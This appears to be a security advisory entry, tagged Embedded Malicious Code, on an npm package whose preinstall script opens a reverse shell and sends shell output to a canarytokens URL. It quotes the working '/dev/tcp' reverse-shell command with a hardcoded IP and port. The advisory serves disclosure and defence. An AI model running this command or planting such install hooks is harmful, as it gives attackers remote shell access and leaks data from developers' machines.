summary: preinstall script opens reverse shell and beacons install-host output to canarytokens endpoint
details: package.json declares a preinstall lifecycle script that runs automatically on npm install. The script executes `bash -i >& /dev/tcp/147.93.157.202/8080` to open an interactive reverse shell to the hardcoded IP 147.93.157.202 on port 8080, and simultaneously pipes shell stdout/stderr over plain HTTP into a POST request against http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php. Installing the package causes install-host command output to leave the machine to a third-party tracking endpoint on every install, and grants interactive shell access to whoever controls the hardcoded IP if that host is reachable. The name resembles a legitimate authentication package but the shipped code performs no authentication behavior.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
